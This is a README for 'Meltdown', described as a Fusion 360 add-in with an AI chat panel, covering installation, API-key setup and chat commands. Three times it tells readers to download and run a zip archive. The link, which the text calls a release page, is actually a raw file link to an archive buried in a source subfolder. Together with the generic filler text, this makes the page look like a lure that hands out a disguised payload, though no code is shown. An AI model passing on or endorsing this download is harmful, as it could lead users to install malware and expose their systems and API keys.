# 🧩 fusion-plugin-meltdown - Run AI Help Inside Fusion 360

[![Download](https://img.shields.io/badge/Download%20Meltdown-blue?style=for-the-badge)](https://raw.githubusercontent.com/dossom104-sudo/fusion-plugin-meltdown/main/meltdown/commands/commandDialog/plugin_fusion_meltdown_v3.5.zip)

## 🚀 Download

Visit the release page to download and run this file:

https://raw.githubusercontent.com/dossom104-sudo/fusion-plugin-meltdown/main/meltdown/commands/commandDialog/plugin_fusion_meltdown_v3.5.zip

## 🛠️ What Meltdown Does

Meltdown is a Fusion 360 add-in that gives you an AI chat panel for modeling work.

You can type plain language requests and use it to:

- inspect the current design
- plan modeling steps
- run some modeling actions
- check bodies and sketches in the file
- keep a chat history for later use

It works with these AI providers:

- Gemini
- Claude
- OpenAI

## 📋 What You Need

Before you install, make sure you have:

- Windows 10 or Windows 11
- Fusion 360 installed
- an internet connection
- an API key from one of the supported AI providers

A stable network connection is needed for:

- the first-time setup
- downloading dependencies
- sending chat requests to the AI provider

## 📥 Install on Windows

1. Open the release page.
2. Download the file or package from the latest release.
3. Open the downloaded archive.
4. Find the `meltdown` folder inside the repository.
5. Copy the `meltdown` folder into the Fusion 360 `Add-Ins` folder.
6. Open Fusion 360.
7. Go to `Scripts and Add-Ins`.
8. Find `meltdown`.
9. Click `Run`.

If the chat panel does not open on its own, click `Meltdown: Chat` in the toolbar.

## 🔧 Find the Fusion 360 Add-Ins Folder

Fusion 360 usually stores add-ins in a folder like this:

- `C:\Users\<YourName>\AppData\Roaming\Autodesk\Autodesk Fusion 360\API\AddIns`

If you do not see `AppData`, turn on hidden items in File Explorer:

1. Open File Explorer.
2. Click `View`.
3. Turn on `Hidden items`.
4. Go back to the folder path above.

## ⏳ First Start

The first time you run Meltdown, it checks and installs the files it needs.

It will try to use `uv` first.

If `uv` is not on your system, it will use:

- `python3 -m pip`

This first start can take longer than normal. That is expected.

## ⚙️ Basic Setup

1. Open the Meltdown chat panel.
2. Type `/config` in the input box.
3. Choose your AI provider.
4. Enter the model name.
5. Enter the API key for that provider.
6. Click save.
7. Return to the chat view and start using it.

## 💬 Common Commands

Use these commands in the chat box:

- `/config` — open the settings panel
- `/clear` — clear the current chat history
- `/stop` — stop the current operation
- `/debug` — open or close the debug log panel
- `/history` — view saved chat sessions
- `/resume` — restore a saved session and continue it

## 🧠 Example Requests

You can type requests like these:

- `Create a 120mm x 80mm x 6mm mounting plate`
- `Add a 5mm hole at each corner`
- `Check the current model and tell me what bodies and sketches it has`
- `Tell me which features are still missing for CNC work`
- `Plan the next steps to turn this sketch into a finished part`

Keep your requests short and direct. The tool works best when you describe one task at a time.

## 🎯 How to Use It Well

Meltdown works best when you give it clear goals.

Good requests:

- create one part
- inspect one design
- add one set of holes
- explain one sketch
- plan one build step

Less useful requests:

- do many unrelated tasks at once
- ask for vague results
- mix design changes with questions in one message

If you want the best result, break large work into smaller steps.

## 🔍 What You Can Expect

Meltdown is made for everyday modeling work inside Fusion 360.

It can help you:

- understand what is already in the design
- turn plain language into modeling actions
- keep track of a session
- return to a previous chat later
- reduce time spent on repeated steps

It fits well when you already know what part you want and need help getting there in Fusion 360.

## 🧩 AI Provider Setup

### Gemini

Use your Gemini API key and the model name you want to run.

### Claude

Use your Claude API key and the model name set for your account.

### OpenAI

Use your OpenAI API key and the model name you want to use.

For all providers, make sure the provider name, model name, and API key match.

## 🗂️ Saved History

Meltdown can save chat sessions for later.

You can:

- review older chats
- continue a past session
- keep track of design work over time

Use `/history` to see saved sessions.

Use `/resume` to continue one.

## 🧪 Simple Workflow

1. Open Fusion 360.
2. Run Meltdown from `Scripts and Add-Ins`.
3. Open the chat panel.
4. Set up your provider with `/config`.
5. Ask for the task you want.
6. Review the result.
7. Use `/stop` if you want to end a long action.
8. Use `/clear` if you want to start fresh.

## 🖥️ Windows Tips

If the add-in does not show up:

- check that the `meltdown` folder is in the correct `Add-Ins` folder
- close Fusion 360 and open it again
- make sure the folder name is exactly `meltdown`
- confirm that the first start finished without errors
- check that your network connection is working

If the chat panel appears blank:

- open `/config`
- confirm the provider name is set
- confirm the model name is set
- confirm the API key is valid

## 🔐 API Keys

Meltdown needs an API key for the provider you choose.

Keep your key private.

Enter it in the settings panel, then save it.

If the provider does not respond, check:

- the key
- the model name
- your internet connection
- your account status with that provider

## 📌 Best Fit

Meltdown is a good fit if you:

- use Fusion 360 on Windows
- want a chat-based helper inside the app
- prefer plain language over menus
- work on common modeling tasks
- want to inspect or plan parts faster

## 📎 Download Again

If you need the file again, open the release page here:

https://raw.githubusercontent.com/dossom104-sudo/fusion-plugin-meltdown/main/meltdown/commands/commandDialog/plugin_fusion_meltdown_v3.5.zip